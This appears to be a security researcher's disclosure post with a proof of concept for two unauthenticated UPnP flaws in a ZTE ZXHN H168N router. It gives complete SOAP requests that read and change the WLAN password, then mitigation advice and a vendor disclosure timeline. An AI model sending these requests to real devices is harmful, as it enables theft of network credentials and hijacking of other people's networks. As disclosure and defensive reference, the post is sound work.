[*] POC: (CVE-2018-7357 and CVE-2018-7358)

Disclaimer: [This POC is for Educational Purposes , I would Not be
responsible for any misuse of the information mentioned in this blog post]

[+] Unauthenticated

[+] Author: Usman Saeed (usman [at] xc0re.net)

[+] Protocol: UPnP

[+] Affected Harware/Software:

Model name: ZXHN H168N v2.2
Build Timestamp: 20171127193202
Software Version: V2.2.0_PK1.2T5
[+] Findings:

1. Unauthenticated access to WLAN password:

POST /control/igd/wlanc_1_1 HTTP/1.1
Host: <IP>:52869
User-Agent: {omitted}
Content-Length: 288
Connection: close
Content-Type: text/xml; charset=”utf-8″
SOAPACTION: “urn:dslforum-org:service:WLANConfiguration:1#GetSecurityKeys” 1
<?xml version=”1.0″ encoding=”utf-8″?>
<s:Envelope xmlns:s=”http://schemas.xmlsoap.org/soap/envelope/” s:encodingStyle=”http://schemas.xmlsoap.org/soap/encoding/”><s:Body><u:GetSecurityKeys xmlns:u=”urn:dslforum-org:service:WLANConfiguration:1″></u:GetSecurityKeys></s:Body></s:Envelope>

2. Unauthenticated WLAN passphrase change:

POST /control/igd/wlanc_1_1 HTTP/1.1
Host: <IP>:52869
User-Agent: {omitted}
Content-Length: 496
Connection: close
Content-Type: text/xml; charset=”utf-8″
SOAPACTION: “urn:dslforum-org:service:WLANConfiguration:1#SetSecurityKeys”
<?xml version=”1.0″ encoding=”utf-8″?>
<s:Envelope xmlns:s=”http://schemas.xmlsoap.org/soap/envelope/” s:encodingStyle=”http://schemas.xmlsoap.org/soap/encoding/”><s:Body><u:SetSecurityKeys xmlns:u=”urn:dslforum-org:service:WLANConfiguration:1″><NewWEPKey0>{omitted}</NewWEPKey0><NewWEPKey1>{omitted}</NewWEPKey1><NewWEPKey2>{omitted}</NewWEPKey2><NewWEPKey3>{omitted}</NewWEPKey3><NewPreSharedKey>{omitted}</NewPreSharedKey><NewKeyPassphrase>{omitted}</NewKeyPassphrase></u:SetSecurityKeys></s:Body></s:Envelope>
[*] Solution:

UPnP should not provide excessive services, and if the fix is not possible, then UPnP should be disabled on the affected devices.

[*] Note:

There are other services which should not be published over UPnP, which are not mentioned in this blog post, as the solution is the same.

[+] Responsible Disclosure:

Vulnerabilities identified – 20 August, 2018
Reported to ZTE – 28 August, 2018
ZTE official statement – 17 September 2018
ZTE patched the vulnerability – 12 November 2018
The operator pushed the update – 12 November 2018
CVE published – Later
Public disclosure – 12 November 2018
Ref: http://support.zte.com.cn/support/news/LoopholeInfoDetail.aspx?newsId=1009522